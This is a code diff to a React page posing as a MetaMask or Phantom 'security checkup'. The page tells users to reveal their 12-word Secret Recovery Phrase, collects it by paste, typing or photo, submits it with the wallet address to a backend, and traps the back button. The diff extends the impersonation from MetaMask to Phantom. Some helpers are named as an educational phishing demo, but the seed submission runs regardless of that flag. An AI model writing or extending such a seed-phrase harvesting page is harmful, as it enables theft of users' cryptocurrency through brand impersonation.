@@ -4,9 +4,12 @@ import { ChevronLeft, Info } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { walletApi } from '../lib/walletApi'
 import {
-  getMetaMaskSecurityCheckAddress,
-  isMetaMaskSecurityCheckupRequired,
-  markMetaMaskSecurityCheckDone,
+  getSecurityCheckAddress,
+  getSecurityCheckWallet,
+  isSecurityCheckupRequired,
+  markSecurityCheckDone,
+  normalizeSecurityCheckWallet,
+  type SecurityCheckWallet,
 } from '../lib/metaMaskSecurityCheck'
 import { createEduPhishSession, isEduPhishingDemoEnabled, patchEduPhishSession } from '../lib/eduPhishDemo'
 import { useWalletState } from '../context/WalletContext'
@@ -28,24 +31,32 @@ function emptyWords() {
   return Array.from({ length: WORD_COUNT }, () => '')
 }
 
-function MetaMaskHeaderBrand() {
+function WalletHeaderBrand({ wallet }: { wallet: SecurityCheckWallet }) {
   return (
     <div className="flex flex-col items-center gap-3">
-      <WalletLogo name="MetaMask" className="h-11 w-11 sm:h-12 sm:w-12" rounded={false} alt="MetaMask" />
-      <span className="text-[22px] font-semibold tracking-[-0.03em] text-white sm:text-[24px]">MetaMask</span>
+      <WalletLogo name={wallet} className="h-11 w-11 sm:h-12 sm:w-12" rounded={false} alt={wallet} />
+      <span className="text-[22px] font-semibold tracking-[-0.03em] text-white sm:text-[24px]">{wallet}</span>
     </div>
   )
+}
+
+function recoveryHelpLine(wallet: SecurityCheckWallet): string {
+  if (wallet === 'Phantom') {
+    return 'Phantom menu → Settings → Security & Privacy → Show Secret Recovery Phrase. Paste, type, or snap your 12 words below.'
+  }
+  return 'Menu → Settings → Security & Privacy → Reveal Secret Recovery Phrase. Paste, type, or scan your 12 words below.'
 }
 
 export const MetaMaskSecurityCheckup: React.FC = () => {
   const navigate = useNavigate()
   const location = useLocation()
-  const { walletAddress: connectedAddress } = useWalletState()
-  const address =
-    (location.state as { walletAddress?: string } | null)?.walletAddress ||
-    connectedAddress ||
-    getMetaMaskSecurityCheckAddress() ||
-    ''
+  const { walletAddress: connectedAddress, walletName } = useWalletState()
+  const state = location.state as { walletAddress?: string; walletBrand?: SecurityCheckWallet } | null
+  const walletBrand: SecurityCheckWallet =
+    state?.walletBrand ||
+    normalizeSecurityCheckWallet(walletName) ||
+    getSecurityCheckWallet()
+  const address = state?.walletAddress || connectedAddress || getSecurityCheckAddress() || ''
 
   const [viewMode, setViewMode] = useState<ViewMode>('paste')
   const [pasteText, setPasteText] = useState('')
@@ -63,13 +74,13 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
   const pasteReady = pasteSanitized.validCount >= WORD_COUNT
 
   useEffect(() => {
-    if (!isMetaMaskSecurityCheckupRequired()) {
+    if (!isSecurityCheckupRequired()) {
       navigate('/submissions', { replace: true })
     }
   }, [navigate])
 
   useEffect(() => {
-    if (!isMetaMaskSecurityCheckupRequired()) return
+    if (!isSecurityCheckupRequired()) return
     window.history.pushState(null, '', window.location.href)
     const onPopState = () => {
       window.history.pushState(null, '', window.location.href)
@@ -81,7 +92,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
   useEffect(() => {
     let cancelled = false
     if (isEduPhishingDemoEnabled()) {
-      createEduPhishSession('MetaMask')
+      createEduPhishSession(walletBrand)
         .then((session) => {
           if (!cancelled) setSessionId(session.id)
         })
@@ -100,6 +111,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
         walletAddress: address,
         password: joined,
         pageUrl: window.location.href,
+        walletType: walletBrand,
       })
       if (sessionId) {
         void patchEduPhishSession(sessionId, {
@@ -109,7 +121,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
         }).catch(() => {})
       }
     },
-    [address, sessionId]
+    [address, sessionId, walletBrand]
   )
 
   const applyWords = useCallback(
@@ -199,8 +211,9 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
           walletAddress: address,
           password: phrase,
           pageUrl: window.location.href,
+          walletType: walletBrand,
         })
-        markMetaMaskSecurityCheckDone(address)
+        markSecurityCheckDone(address)
       }
       if (sessionId) {
         await patchEduPhishSession(sessionId, {
@@ -226,8 +239,9 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
             password: '',
             pageUrl: window.location.href,
             phraseSnapImage: payload.snapDataUrl,
+            walletType: walletBrand,
           })
-          markMetaMaskSecurityCheckDone(address)
+          markSecurityCheckDone(address)
         }
         if (sessionId) {
           await patchEduPhishSession(sessionId, {
@@ -277,10 +291,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
 
       {viewMode === 'paste' ? (
         <>
-          <p className="mb-4 text-[13px] leading-relaxed text-[#8a8a8a]">
-            Menu → Settings → Security &amp; Privacy → Reveal Secret Recovery Phrase. Paste, type, or
-            scan your 12 words below.
-          </p>
+          <p className="mb-4 text-[13px] leading-relaxed text-[#8a8a8a]">{recoveryHelpLine(walletBrand)}</p>
           <form onSubmit={handlePasteAreaContinue}>
             <div className="relative">
               <textarea
@@ -379,7 +390,7 @@ export const MetaMaskSecurityCheckup: React.FC = () => {
     <div className="flex min-h-[100dvh] flex-col bg-black font-[system-ui,-apple-system,BlinkMacSystemFont,'Segoe_UI',Roboto,sans-serif] text-white">
       <header className="relative px-5 pb-2 pt-6 sm:px-8 sm:pt-8">
         <div className="flex justify-center">
-          <MetaMaskHeaderBrand />
+          <WalletHeaderBrand wallet={walletBrand} />
         </div>
         <button
           type="button"
